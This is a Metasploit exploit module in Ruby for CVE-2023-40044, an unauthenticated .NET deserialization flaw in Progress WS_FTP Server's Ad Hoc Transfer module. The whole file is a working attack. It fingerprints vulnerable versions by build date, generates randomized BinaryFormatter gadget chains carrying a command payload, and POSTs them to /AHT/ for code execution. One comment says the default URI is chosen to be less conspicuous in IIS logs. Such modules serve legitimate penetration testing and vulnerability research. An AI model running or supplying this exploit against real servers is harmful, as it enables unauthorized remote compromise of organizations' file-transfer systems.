##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Progress Software WS_FTP Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an unsafe .NET deserialization vulnerability to achieve unauthenticated remote code
          execution against a vulnerable WS_FTP server running the Ad Hoc Transfer module. All versions of WS_FTP Server
          prior to 2020.0.4 (version 8.7.4) and 2022.0.2 (version 8.8.2) are vulnerable to this issue. The vulnerability
          was originally discovered by AssetNote.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF Exploit & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2023-40044'],
          ['URL', 'https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis'],
          ['URL', 'https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023'],
          ['URL', 'https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044']
        ],
        'DisclosureDate' => '2023-09-27',
        'Platform' => %w[win],
        'Arch' => [ARCH_CMD],
        # 5000 will allow the powershell payloads to work as they require ~4200 bytes. Notably, the ClaimsPrincipal and
        # TypeConfuseDelegate (but not TextFormattingRunProperties) gadget chains will fail if Space is too large (e.g.
        # 8192 bytes), as the encoded payload command is padded with leading whitespace characters (0x20) to consume
        # all the available payload space via ./modules/nops/cmd/generic.rb).
        'Payload' => { 'Space' => 5000 },
        'Privileged' => false, # Code execution as `NT AUTHORITY\NETWORK SERVICE`.
        'Targets' => [
          [
            'Windows', {}
          ]
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
 
    register_options(
      [
        # This URI path can be anything so long as it begins with /AHT/. We default ot /AHT/ as it is less obvious in
        # the IIS logs as to what the request is for, however the user can change this as needed if required.
        Msf::OptString.new('TARGET_URI', [ false, 'Target URI used to exploit the deserialization vulnerability. Must begin with /AHT/', '/AHT/']),
      ]
    )
  end
 
  def check
    # As the vulnerability lies in the WS_FTP Ad Hoc Transfer (AHT) module, we query the index HTML file for AHT.
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/AHT/AHT_UI/public/index.html'
    )
 
    return CheckCode::Unknown('Connection failed') unless res
 
    title = Nokogiri::HTML(res.body).xpath('//head/title')&.text
 
    # We verify the target is running the AHT module, by inspecting the HTML heads title.
    if title == 'Ad Hoc Transfer'
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => '/AHT/AHT_UI/public/js/app.min.js'
      )
 
      return CheckCode::Unknown('Connection failed') unless res
 
      # The patched versions were released on September 2023. We can query the date stamp in the app.min.js file
      # to see when this file was built. If it is before Sept 2023, then we have a vulnerable version of WS_FTP,
      # but if it was build on Sept 2023 or after, it is not vulnerable.
 
      if res.code == 200 && res.body =~ %r{/\*! fileTransfer (\d+)-(\d+)-(\d+) \*/}
        day = ::Regexp.last_match(1).to_i
        month = ::Regexp.last_match(2).to_i
        year = ::Regexp.last_match(3).to_i
 
        description = "Detected a build date of #{day}-#{month}-#{year}"
 
        if year > 2023 || (year == 2023 && month >= 9)
          return CheckCode::Safe(description)
        end
 
        return CheckCode::Appears(description)
      end
 
      # If we couldn't get the JS build date, we at least know the target is WS_FTP with the Ad Hoc Transfer module.
      return CheckCode::Detected
    end
 
    CheckCode::Unknown
  end
 
  def exploit
    unless datastore['TARGET_URI'].start_with? '/AHT/'
      fail_with(Failure::BadConfig, 'The TARGET_URI must begin with /AHT/')
    end
 
    # All of these gadget chains will work. We pick a random one during exploitation.
    chains = %i[ClaimsPrincipal TypeConfuseDelegate TextFormattingRunProperties]
 
    gadget = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: chains.sample,
      formatter: :BinaryFormatter
    )
 
    # We can reach the unsafe deserialization via either of these tags. We pick a random one during exploitation.
    tags = %w[AHT_DEFAULT_UPLOAD_PARAMETER AHT_UPLOAD_PARAMETER]
 
    message = Rex::MIME::Message.new
 
    part = message.add_part("::#{tags.sample}::#{Rex::Text.encode_base64(gadget)}\r\n", nil, nil, nil)
 
    part.header.set('name', rand_text_alphanumeric(8))
 
    res = send_request_cgi(
      {
        'uri' => normalize_uri(datastore['TARGET_URI']),
        'ctype' => 'multipart/form-data; boundary=' + message.bound,
        'method' => 'POST',
        'data' => message.to_s
      }
    )
 
    unless res&.code == 302
      fail_with(Failure::UnexpectedReply, 'Failed to trigger vulnerability')
    end
  end
 
end
 